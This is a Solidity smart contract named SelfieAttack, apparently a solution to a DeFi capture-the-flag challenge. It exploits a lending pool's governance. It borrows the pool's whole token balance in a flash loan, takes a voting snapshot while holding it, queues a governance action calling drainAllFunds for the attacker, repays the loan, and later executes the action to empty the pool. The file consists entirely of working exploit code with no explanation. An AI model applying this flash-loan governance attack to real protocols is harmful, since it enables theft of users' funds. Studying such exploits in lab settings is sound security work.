// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface IGovernance {
    function queueAction(
        address receiver,
        bytes calldata data,
        uint256 weiAmount
    ) external returns (uint256);

    function executeAction(uint256 actionId) external;
}

interface IFlashLoanPool {
    function flashLoan(uint256 amount) external;
}

interface IToken {
    function snapshot() external returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function balanceOf(address receiver) external view returns (uint256);
}

contract SelfieAttack {
    address immutable attacker;
    IGovernance immutable governance;
    IFlashLoanPool private immutable flashLoan;
    IToken private immutable Token;
    uint256 public actionId;

    //Constructor
    constructor(
        address _addressGov,
        address _flashloanAddress,
        address _tokenaddress
    ) {
        governance = IGovernance(_addressGov);
        attacker = msg.sender;
        flashLoan = IFlashLoanPool(_flashloanAddress);
        Token = IToken(_tokenaddress);
    }

    function attack() external {
        uint256 balance = Token.balanceOf(address(flashLoan));
        flashLoan.flashLoan(balance);
    }

    function receiveTokens(address _tokenAddress, uint256 _amount) external {
        //we recieve tokens
        // uint balance = Token.balanceOf(address(flashLoan));
        Token.snapshot();

        bytes memory data = abi.encodeWithSignature(
            ("drainAllFunds(address)"),
            attacker
        );
        actionId = governance.queueAction(address(flashLoan), data, 0);
        IToken(_tokenAddress).transfer(
            address(flashLoan),
            Token.balanceOf(address(this))
        );
    }

    function withdraw() external {
        governance.executeAction(actionId);
        // uint256 balance = address(this).balance;
        // payable(attacker).transfer(balance);
    }

    receive() external payable {}
}
